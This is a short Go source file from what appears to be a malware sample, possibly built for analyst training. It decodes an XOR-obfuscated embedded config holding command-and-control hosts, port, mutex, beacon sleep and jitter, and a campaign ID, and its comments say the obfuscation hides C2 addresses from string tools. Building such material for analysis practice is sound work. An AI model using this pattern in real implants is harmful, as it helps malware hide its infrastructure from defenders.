package config

import (
	_ "embed"
	"encoding/json"
)

// XOR key — analysts find this via string analysis in Ghidra
const xorKey byte = 0x4C

// config.bin is generated at build time: XOR(0x4C, JSON config)
// strings(1) will NOT reveal C2 addresses — they exist only as XOR bytes
//
//go:embed config.bin
var encodedConfig []byte

type Config struct {
	C2Primary   string  `json:"c2_primary"`
	C2Port      int     `json:"c2_port"`
	C2Secondary string  `json:"c2_secondary"`
	UserAgent   string  `json:"user_agent"`
	MutexName   string  `json:"mutex"`
	SleepMin    int     `json:"sleep_min"`
	SleepMax    int     `json:"sleep_max"`
	Jitter      float64 `json:"jitter"`
	CampaignID  string  `json:"campaign"`
}

func Decode() Config {
	raw := make([]byte, len(encodedConfig))
	for i, b := range encodedConfig {
		raw[i] = b ^ xorKey
	}
	var cfg Config
	json.Unmarshal(raw, &cfg)
	return cfg
}
